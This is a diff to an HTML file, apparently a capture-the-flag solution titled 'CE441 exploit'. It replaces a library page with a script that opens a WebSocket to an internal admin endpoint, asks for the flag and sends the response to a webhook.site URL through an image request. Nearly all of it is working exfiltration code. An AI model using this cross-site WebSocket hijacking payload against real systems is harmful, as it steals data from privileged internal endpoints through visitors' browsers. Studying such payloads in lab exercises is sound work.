@@ -2,6 +2,45 @@
 <html>
   <head>
     <meta charset="utf-8">
+    <title>CE441 exploit</title>
+  </head>
+  <body>
+    <h1>Loading...</h1>
+    <script>
+      (function () {
+ 
+        const ws = new WebSocket("ws://web:8080/admin/ws");
+
+        ws.onopen = function () {
+
+          ws.send("flag");
+        };
+
+        ws.onmessage = function (event) {
+          const flag = event.data;
+
+
+          const WEBHOOK_URL = "https://webhook.site/ccf58a66-0e07-4ad6-9d1e-582c993cbf9f";
+
+          const img = new Image();
+          img.src = WEBHOOK_URL + "?flag=" + encodeURIComponent(flag);
+
+          try { ws.close(); } catch (e) {}
+        };
+
+        ws.onerror = function (e) {
+          console.log("ws error", e);
+        };
+      })();
+    </script>
+  </body>
+</html>
+
+
+<!-- <!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
     <title>Library document</title>
   </head>
   <body>
@@ -50,4 +89,4 @@
       })();
     </script>
   </body>
-</html>
+</html> -->
